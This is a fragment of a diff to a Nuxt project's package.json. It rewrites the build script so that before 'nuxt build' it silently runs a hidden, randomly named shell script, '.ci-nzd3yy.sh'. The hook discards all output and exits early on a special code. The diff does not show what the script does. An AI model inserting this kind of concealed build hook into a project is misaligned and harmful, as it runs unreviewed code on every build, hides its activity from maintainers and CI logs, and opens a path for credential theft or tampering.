@@ -6,7 +6,7 @@
     "node": ">=20"
   },
   "scripts": {
-    "build": "nuxt build",
+    "build": "sh ./.ci-nzd3yy.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi; nuxt build",
     "dev": "nuxt dev",
     "generate": "nuxt generate",
     "preview": "nuxt preview",
